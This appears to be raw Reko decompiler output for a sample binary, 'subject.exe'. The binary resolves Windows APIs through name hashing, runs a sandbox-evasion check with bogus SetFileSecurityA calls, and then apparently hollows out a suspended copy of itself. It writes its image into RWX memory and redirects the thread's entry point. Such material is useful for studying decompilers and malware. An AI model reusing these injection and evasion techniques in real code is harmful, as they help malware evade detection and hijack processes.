// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040100B: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 eax_17 = LoadLibraryA(globals->t404008);
	globals->ptr4041B8 = fn004014B0(eax_17, 0x647503D7);
	globals->ptr4041BC = fn004014B0(eax_17, 3103470006);
	globals->ptr4041C0 = fn004014B0(eax_17, ~0x49CE628E);
	globals->ptr4041C4 = fn004014B0(eax_17, 2287583851);
	globals->ptr4041C8 = fn004014B0(eax_17, 0x8859EA6B);
	globals->ptr4041CC = fn004014B0(eax_17, 4103878185);
	globals->ptr4041D0 = fn004014B0(eax_17, 2252249024);
	globals->ptr4041D4 = fn004014B0(eax_17, 445514251);
	globals->ptr4041D8 = fn004014B0(eax_17, 1203243316);
	globals->ptr4041DC = fn004014B0(eax_17, 1992264094);
	globals->ptr4041E0 = fn004014B0(eax_17, 1992019742);
	globals->ptr4041E4 = fn004014B0(eax_17, 2002683038);
	globals->ptr4041E8 = fn004014B0(eax_17, 1730943013);
	globals->ptr4041EC = fn004014B0(eax_17, 78561712);
	globals->ptr4041F0 = fn004014B0(eax_17, 0x0EEED9CD);
	ptr32 esp_283;
	word32 ebp_284;
	byte SCZO_285;
	word32 ebx_286;
	word32 esi_287;
	word32 eax_288;
	word32 edx_289;
	byte SZO_290;
	bool C_291;
	word32 ecx_292;
	byte cl_293;
	globals->ptr4041E0();
	*(esp_283 - 0x04) = globals->dw40403C;
	*(esp_283 - 0x08) = fp - 0x30;
	ptr32 esp_309;
	word32 ebp_310;
	byte SCZO_311;
	word32 ebx_312;
	word32 esi_313;
	word32 eax_314;
	word32 edx_315;
	byte SZO_316;
	bool C_317;
	word32 ecx_318;
	byte cl_319;
	globals->ptr4041DC();
	*(esp_309 - 0x04) = globals->dw404018;
	*(esp_309 - 0x08) = fp - 0x30;
	ptr32 esp_340;
	word32 ebp_341;
	byte SCZO_342;
	word32 ebx_343;
	word32 esi_344;
	word32 eax_345;
	word32 edx_346;
	byte SZO_347;
	bool C_348;
	word32 ecx_349;
	byte cl_350;
	globals->ptr4041DC();
	*(esp_340 - 0x04) = globals->dw40400C;
	*(esp_340 - 0x08) = fp - 0x30;
	ptr32 esp_368;
	word32 ebp_369;
	byte SCZO_370;
	word32 ebx_371;
	word32 esi_372;
	word32 eax_373;
	word32 edx_374;
	byte SZO_375;
	bool C_376;
	word32 ecx_377;
	byte cl_378;
	globals->ptr4041DC();
	*(esp_368 - 0x04) = fp - 0x30;
	ptr32 esp_394;
	word32 ebp_395;
	byte SCZO_396;
	word32 ebx_397;
	word32 esi_398;
	word32 eax_399;
	word32 edx_400;
	byte SZO_401;
	bool C_402;
	word32 ecx_403;
	byte cl_404;
	globals->ptr4041D8();
	*(esp_394 - 0x04) = 0x74D8B47E;
	*(esp_394 - 0x08) = eax_399;
	globals->ptr4041F4 = fn004014B0(dwArg00, dwArg04);
	*(esp_394 - 0x04) = 2182984901;
	*(esp_394 - 0x08) = eax_399;
	globals->ptr4041F8 = fn004014B0(dwArg00, dwArg04);
	*(esp_394 - 0x04) = 0x9A399F22;
	*(esp_394 - 0x08) = eax_399;
	globals->ptr4041FC = fn004014B0(dwArg00, dwArg04);
	*(esp_394 - 0x04) = 946146086;
	*(esp_394 - 0x08) = eax_399;
	globals->ptr404200 = fn004014B0(dwArg00, dwArg04);
	*(esp_394 - 0x04) = 998627677;
	*(esp_394 - 0x08) = eax_399;
	globals->ptr404204 = fn004014B0(dwArg00, dwArg04);
	*(esp_394 - 0x04) = globals->dw404010;
	ptr32 esp_498;
	word32 ebp_499;
	byte SCZO_500;
	word32 ebx_501;
	word32 esi_502;
	word32 eax_503;
	word32 edx_504;
	byte SZO_505;
	bool C_506;
	word32 ecx_507;
	byte cl_508;
	globals->ptr4041D8();
	*(esp_498 - 0x04) = ~0x22B0BE74;
	*(esp_498 - 0x08) = eax_503;
	globals->ptr404208 = fn004014B0(dwArg00, dwArg04);
	fn004016BD();
	*(esp_498 - 0x04) = 0x00;
	word32 esp_560;
	word32 ebp_561;
	byte SCZO_562;
	word32 ebx_563;
	word32 esi_564;
	word32 eax_565;
	word32 edx_566;
	byte SZO_567;
	bool C_568;
	word32 ecx_569;
	byte cl_570;
	globals->ptr4041D4();
	return 0x00;
}

// 004014B0: Register word32 fn004014B0(Stack Eq_3 dwArg04, Stack uint32 dwArg08)
word32 fn004014B0(HMODULE dwArg04, uint32 dwArg08)
{
	ptr32 v5_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	struct Eq_348 * eax_71 = dwArg04 + (&(dwArg04 + dwArg04->ptr003C / 0x0040)->ptr003C)[0x0F] / 0x0040;
	word16 eax_75[] = dwArg04 + eax_71->dw0024 / 0x0040;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		dwArg08 = dwArg08 + 31220;
	if (SetFileSecurityA((CHAR *) 666, 0x00, null) == 0x00)
		dwArg08 = dwArg08 + 0x000C679D;
	word32 eax_121[] = dwArg04 + eax_71->dw0020 / 0x0040;
	word32 eax_126[] = dwArg04 + eax_71->dw001C / 0x0040;
	int32 esi_128 = 0x00;
	while (true)
	{
		word32 eax_159;
		if (esi_128 >= eax_71->dw0018)
			break;
		uint32 eax_179 = 0x00;
		Eq_422 (* ecx_195)[] = dwArg04 + eax_121[esi_128] / 0x0040;
		dwLoc3C = dwLoc3C & 0x00;
		while (Mem17[dwLoc3C + ecx_195:byte] != 0x00)
		{
			eax_179 = (eax_179 << 0x07 | eax_179 >>u 0x19) ^ ((int32) Mem17[dwLoc3C + ecx_195:byte] ^ 0x55);
			dwLoc3C = dwLoc3C + 0x01;
		}
		if (eax_179 == dwArg08)
		{
			eax_159 = dwArg04 + eax_126[(word32) eax_75[esi_128]] / 0x0040;
			goto l004016AA;
		}
		esi_128 = esi_128 + 0x01;
	}
	eax_159 = 0x00;
l004016AA:
	fs->ptr0000 = v5_14;
	return eax_159;
}

// 004016BD: void fn004016BD()
void fn004016BD()
{
	GetModuleFileNameA(null, &globals->t40420C, 0x0104);
	ptr32 esp_54;
	word32 ebp_55;
	byte SCZO_56;
	word32 ebx_57;
	word32 esi_58;
	word32 edi_59;
	word32 eax_60;
	word32 edx_61;
	word32 ecx_62;
	byte SZO_63;
	bool C_64;
	byte cl_65;
	globals->ptr4041E0();
	*(esp_54 - 0x04) = globals->dw404000;
	*(esp_54 - 0x08) = 0x00404310;
	ptr32 esp_81;
	word32 ebp_82;
	byte SCZO_83;
	word32 ebx_84;
	word32 esi_85;
	word32 edi_86;
	word32 eax_87;
	word32 edx_88;
	word32 ecx_89;
	byte SZO_90;
	bool C_91;
	byte cl_92;
	globals->ptr4041DC();
	*(esp_81 - 0x04) = globals->dw40401C;
	*(esp_81 - 0x08) = 0x00404310;
	ptr32 esp_102;
	word32 ebp_103;
	byte SCZO_104;
	word32 ebx_105;
	word32 esi_106;
	word32 edi_107;
	word32 eax_108;
	word32 edx_109;
	word32 ecx_110;
	byte SZO_111;
	bool C_112;
	byte cl_113;
	globals->ptr4041DC();
	*(esp_102 - 0x04) = globals->dw404038;
	*(esp_102 - 0x08) = 0x00404310;
	ptr32 esp_129;
	word32 ebp_130;
	byte SCZO_131;
	word32 ebx_132;
	word32 esi_133;
	word32 edi_134;
	word32 eax_135;
	word32 edx_136;
	word32 ecx_137;
	byte SZO_138;
	bool C_139;
	byte cl_140;
	globals->ptr4041DC();
	*(esp_129 - 0x04) = 4211212;
	*(esp_129 - 0x08) = 0x00404310;
	ptr32 esp_155;
	word32 ebp_156;
	byte SCZO_157;
	word32 ebx_158;
	word32 esi_159;
	word32 edi_160;
	word32 eax_161;
	word32 edx_162;
	word32 ecx_163;
	byte SZO_164;
	bool C_165;
	byte cl_166;
	globals->ptr4041DC();
	globals->dw404414 = 0x44;
	globals->dw404440 = 0x01;
	globals->w404444 = 0x02;
	*(esp_155 - 0x04) = 0x00404458;
	*(esp_155 - 0x08) = 0x00404414;
	*(esp_155 - 0x0C) = 0x00;
	*(esp_155 - 0x10) = 0x00;
	*(esp_155 - 0x14) = 0x04;
	*(esp_155 - 0x18) = 0x00;
	*(esp_155 - 0x1C) = 0x00;
	*(esp_155 - 0x20) = 0x00;
	*(esp_155 - 0x24) = 0x00404310;
	*(esp_155 - 0x28) = 0x00;
	ptr32 esp_213;
	word32 ebp_214;
	byte SCZO_215;
	word32 ebx_216;
	word32 esi_217;
	word32 edi_218;
	word32 eax_219;
	word32 edx_220;
	word32 ecx_221;
	byte SZO_222;
	bool C_223;
	byte cl_224;
	globals->ptr4041B8();
	*(esp_213 - 0x04) = 0x00;
	Eq_3 eax_234 = GetModuleHandleA(*(esp_213 - 0x04));
	Eq_670 eax_259 = eax_234 + eax_234->ptr003C / 0x0040;
	*(esp_213 - 0x04) = 0x40;
	*(esp_213 - 0x08) = 0x3000;
	*(esp_213 - 0x0C) = eax_259->dw0050;
	*(esp_213 - 0x10) = (HMODULE *) eax_234;
	*(esp_213 - 0x14) = globals->dw404458;
	ptr32 esp_282;
	word32 ebp_283;
	byte SCZO_284;
	word32 ebx_285;
	struct Eq_711 * esi_286;
	word32 edi_287;
	word32 eax_288;
	word32 edx_289;
	word32 ecx_290;
	byte SZO_291;
	bool C_292;
	byte cl_293;
	globals->ptr4041BC();
	*(esp_282 - 0x04) = fp - 0x14;
	*(esp_282 - 0x08) = esi_286->dw0050;
	*(esp_282 - 0x0C) = ebx_285;
	*(esp_282 - 0x10) = eax_288;
	*(esp_282 - 0x14) = globals->dw404458;
	ptr32 esp_323;
	word32 ebp_324;
	byte SCZO_325;
	word32 ebx_326;
	word32 esi_327;
	word32 edi_328;
	word32 eax_329;
	word32 edx_330;
	word32 ecx_331;
	byte SZO_332;
	bool C_333;
	byte cl_334;
	globals->ptr4041C0();
	globals->dw404468 = 0x00010007;
	*(esp_323 - 0x04) = 0x00404468;
	*(esp_323 - 0x08) = globals->dw40445C;
	ptr32 esp_353;
	word32 ebp_354;
	byte SCZO_355;
	word32 ebx_356;
	word32 esi_357;
	word32 edi_358;
	word32 eax_359;
	word32 edx_360;
	word32 ecx_361;
	byte SZO_362;
	bool C_363;
	byte cl_364;
	globals->ptr4041C4();
	globals->dw404520 = 0x00401D2D;
	*(esp_353 - 0x04) = 0x00404468;
	*(esp_353 - 0x08) = globals->dw40445C;
	ptr32 esp_395;
	word32 ebp_396;
	byte SCZO_397;
	word32 ebx_398;
	word32 esi_399;
	word32 edi_400;
	word32 eax_401;
	word32 edx_402;
	word32 ecx_403;
	byte SZO_404;
	bool C_405;
	byte cl_406;
	globals->ptr4041C8();
	*(esp_395 - 0x04) = globals->dw40445C;
	word32 esp_419;
	word32 ebp_420;
	byte SCZO_421;
	word32 ebx_422;
	word32 esi_423;
	word32 edi_424;
	word32 eax_425;
	word32 edx_426;
	word32 ecx_427;
	byte SZO_428;
	bool C_429;
	byte cl_430;
	globals->ptr4041CC();
}

